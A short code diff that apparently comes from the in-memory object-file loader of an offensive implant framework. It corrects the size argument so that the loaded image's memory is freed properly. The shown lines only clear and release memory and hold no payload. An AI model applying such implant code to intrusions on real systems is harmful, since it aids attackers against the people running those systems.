@@ -466,7 +466,7 @@ VOID CoffeeCleanup( PCOFFEE Coffee )
         MemSet( Coffee->ImageBase, 0, Coffee->BofSize );
 
     Pointer = Coffee->ImageBase;
-    Size    = Coffee->BofSize;
+    Size    = 0; /* MEM_RELEASE requires Size to be zero when freeing the whole allocation */
     if ( ! NT_SUCCESS( ( NtStatus = SysNtFreeVirtualMemory( NtCurrentProcess(), &Pointer, &Size, MEM_RELEASE ) ) ) )
     {
         NtSetLastError( Instance->Win32.RtlNtStatusToDosError( NtStatus ) );
